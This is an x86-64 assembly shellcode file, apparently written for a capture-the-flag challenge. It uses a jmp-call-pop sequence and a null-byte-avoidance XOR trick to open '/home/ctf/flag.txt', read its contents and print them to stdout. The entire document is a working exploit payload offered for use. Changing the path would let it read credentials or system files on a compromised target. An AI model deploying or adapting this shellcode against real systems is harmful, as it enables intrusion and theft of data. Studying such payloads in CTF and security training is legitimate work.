BITS 64

global _start

section .text

_start:
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
xor byte [rdi + 18], 0x41
  
xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0x100
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0x100; size to read
xor rax, rax
syscall
  
; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax
xor rax, rax
add al, 1
syscall
  
; syscall exit
xor rdi, rdi
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "/home/ctf/flag.txtA"
